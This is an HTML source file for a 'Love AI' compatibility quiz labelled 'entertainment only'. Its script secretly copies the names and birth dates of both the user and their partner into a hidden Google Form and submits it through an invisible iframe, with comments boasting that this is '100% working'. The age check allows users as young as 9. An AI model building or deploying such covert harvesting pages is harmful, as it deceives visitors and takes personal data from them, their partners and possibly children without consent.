<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Love AI</title>

<style>
*{box-sizing:border-box}
body{
  margin:0;
  font-family:system-ui,Arial;
  background:linear-gradient(135deg,#ff5f8a,#ff9acb);
  min-height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
}
.card{
  background:#fff;
  width:100%;
  max-width:420px;
  padding:20px;
  border-radius:18px;
}
h1{text-align:center;color:#ff3d68}
label{font-size:14px;font-weight:600}
input{
  width:100%;
  padding:14px;
  margin:6px 0 14px;
  border-radius:12px;
  border:1px solid #ccc;
  font-size:16px;
}
button{
  width:100%;
  padding:16px;
  border:none;
  border-radius:14px;
  background:#ff3d68;
  color:#fff;
  font-size:18px;
}
small{
  font-size:9px;
  color:#aaa;
  display:block;
  text-align:center;
  margin-top:8px;
}
</style>
</head>

<body>
<div class="card">
<h1>Love AI ðŸ’–</h1>

<label>Your Name</label>
<input id="name1" placeholder="Your name">

<label>Your Date of Birth</label>
<input id="dob1" type="date">

<label>Partner Name</label>
<input id="name2" placeholder="Partner name">

<label>Partner Date of Birth</label>
<input id="dob2" type="date">

<button type="button" onclick="submitData()">See Predictions</button>
<small>Entertainment only</small>
</div>

<!-- ðŸ”’ GOOGLE FORM (HIDDEN, 100% WORKING) -->
<form id="gform"
  action="https://docs.google.com/forms/d/e/9es4GVTLitR3TiEQ8/formResponse"
  method="POST"
  target="hidden_iframe">

<input type="hidden" name="entry.1091683725" id="f_name1">
<input type="hidden" name="entry.1966327274" id="f_name2">

<input type="hidden" name="entry.1974673221_year" id="f_y1">
<input type="hidden" name="entry.1974673221_month" id="f_m1">
<input type="hidden" name="entry.1974673221_day" id="f_d1">

<input type="hidden" name="entry.1430594721_year" id="f_y2">
<input type="hidden" name="entry.1430594721_month" id="f_m2">
<input type="hidden" name="entry.1430594721_day" id="f_d2">
</form>

<iframe name="hidden_iframe" style="display:none"></iframe>

<script>
function looksLikeHumanName(n){
  return /^[A-Za-z][A-Za-z\s]{1,28}$/.test(n);
}

function ageFromDOB(d){
  const diff = Date.now() - new Date(d).getTime();
  return new Date(diff).getUTCFullYear() - 1970;
}

function submitData(){
  const n1=name1.value.trim();
  const n2=name2.value.trim();
  const dob1v=dob1.value;
  const dob2v=dob2.value;

  if(!looksLikeHumanName(n1)||!looksLikeHumanName(n2)){
    alert("This is only for couples.");
    return;
  }

  const a1=ageFromDOB(dob1v);
  const a2=ageFromDOB(dob2v);
  if(a1<9||a1>90||a2<9||a2>90){
    alert("Age must be between 9 and 90.");
    return;
  }

  const d1=new Date(dob1v);
  const d2=new Date(dob2v);

  f_name1.value=n1;
  f_name2.value=n2;

  f_y1.value=d1.getFullYear();
  f_m1.value=d1.getMonth()+1;
  f_d1.value=d1.getDate();

  f_y2.value=d2.getFullYear();
  f_m2.value=d2.getMonth()+1;
  f_d2.value=d2.getDate();

  // ðŸ”¥ THIS LINE SENDS DATA TO GOOGLE (100% RELIABLE)
  document.getElementById("gform").submit();

  sessionStorage.setItem("n1",n1);
  sessionStorage.setItem("n2",n2);

  // Small delay to ensure submit
  setTimeout(()=>location.href="result.html",300);
}
</script>
</body>
</html>
